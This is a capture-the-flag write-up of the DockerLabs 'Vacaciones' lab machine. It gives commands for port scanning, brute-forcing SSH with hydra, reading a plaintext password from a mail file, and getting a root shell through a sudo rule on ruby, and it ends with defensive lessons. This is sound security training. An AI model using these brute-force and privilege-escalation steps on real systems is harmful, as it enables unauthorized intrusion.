# Vacaciones - DockerLabs - Easy

## Summary
Vacaciones is an easy Linux Docker container exposing SSH and a web server on
port 80. The web page appears blank, but an HTML comment in the source reveals
a hint pointing to a mail for Camilo. Hydra is used to brute-force Camilo's SSH
credentials. Once inside, a plaintext email in `/var/mail/camilo` contains
Juan's password. Switching to Juan reveals a misconfigured sudo rule allowing
`/usr/bin/ruby` without a password, leading to immediate root.

## Tools
- `nmap`
- `hydra`
- `ssh`

---

## 1. Enumeration

### Port Scanning

```sh
nmap -sV -sC -p- 172.17.0.2
```

```
22/tcp open ssh  OpenSSH
80/tcp open http Apache
```

### Web Enumeration

Navigating to `http://172.17.0.2`, the page appears completely empty. Inspecting
the page source reveals a hidden HTML comment:

```html
<!--De : Juan Para: Camilo , te he dejado un correo es importante...-->
```

This tells us two usernames exist on the system — **Juan** and **Camilo** —
and that there is an important email waiting for Camilo.

---

## 2. Exploitation

### Brute-Forcing SSH (Hydra)

We know the username `camilo` from the HTML comment. We brute-force his SSH
password:

```sh
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

```
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
```

### SSH Access as Camilo

If the host key has changed from a previous container run, clear it first:

```sh
ssh-keygen -f '/home/mapacheroja/.ssh/known_hosts' -R '172.17.0.2'
```

Then connect:

```sh
ssh camilo@172.17.0.2
# password: password1
```

### Finding Juan's Password

Following the hint from the HTML comment, we check Camilo's mail:

```sh
cat /var/mail/camilo/correo.txt
```

```
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe.
Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

### Lateral Movement to Juan

```sh
su juan
# password: 2k84dicb
```

## 3. Privilege Escalation

### Sudo Enumeration

```sh
sudo -l
```

```
User juan may run the following commands on 27e7bc7e99c5:
    (ALL) NOPASSWD: /usr/bin/ruby
```

Juan can run `ruby` as root without a password.

### Exploitation (GTFOBins — ruby)

```sh
sudo ruby -e 'exec "/bin/sh"'
```

```sh
whoami
# root
```

---

## 4. Lessons Learned

- **Never leave sensitive information in HTML comments** — source code is always
  visible to anyone, even when the page appears blank.
- **Weak passwords are trivially brute-forced** — `password1` is in the first
  few thousand entries of rockyou.txt; SSH should enforce key-based auth and
  fail2ban.
- **Plaintext credentials in mail files** — passwords should never be shared via
  unencrypted internal mail or text files.
- **Password reuse / lateral movement** — one compromised account led directly
  to another through a shared password.
- **`sudo NOPASSWD` on scripting interpreters** (ruby, python, perl) is an
  immediate root escalation — `exec "/bin/sh"` spawns a root shell. Any
  interpreter in a sudo rule should be treated as full root access.
